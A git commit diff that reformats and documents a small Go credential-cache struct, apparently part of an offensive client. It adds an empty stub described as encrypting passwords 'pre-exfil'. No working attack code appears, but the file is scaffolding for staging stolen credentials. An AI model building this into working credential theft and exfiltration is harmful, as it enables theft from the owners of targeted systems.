d6d475b62918363727c1b890d176a243e4bed5dc
degenerat3 <james.maskelony@gmail.com>
2019-02-27 15:11:30 -0500

    doc fix, minor refac

--- client/cred_cache/cred_cache.go
+++ client/cred_cache/cred_cache.go
@@ -1,31 +1,41 @@
-// This file holds the "object" information/functions needed for the credential cache
+//Package cred_cache This file holds the "object" information/functions needed for the credential cache
 //@author: degenerat3
 package cred_cache
 
-import(
+import (
 	"fmt"
 )
 
+//CredCache is the struct will be the "object" which holds cred info
 type CredCache struct {
-	Hostname	string
-	Credentials	[]string
+	Hostname    string
+	Credentials []string
 }
 
-func (c *CredCache) Get_entries() []string{
-	fmt.Printf("%s\n",c.Credentials)
+//Get_entries fetches all stored credentials
+func (c *CredCache) Get_entries() []string {
+	fmt.Printf("%s\n", c.Credentials)
 	return c.Credentials
 }
 
-func (c *CredCache) Add_entry(cred string){
+//Add_entry adds a credential set to the object
+func (c *CredCache) Add_entry(cred string) {
 	creds := c.Credentials
 	creds = append(creds, cred)
 	c.Credentials = creds
 }
 
-func (c *CredCache) Count_entries() int{
+//Count_entries returns number of stored credentials
+func (c *CredCache) Count_entries() int {
 	return len(c.Credentials)
 }
 
-func (c *CredCache) Get_hostname() string{
-	return(c.Hostname)
+//Get_hostname returns the hostname associated with the cache
+func (c *CredCache) Get_hostname() string {
+	return (c.Hostname)
+}
+
+//Encrypt_entries uses AES to encrypt passwords pre-exfil
+func (c *CredCache) Encrypt_entries() {
+	// iterate through entries, encrypt each one
 }
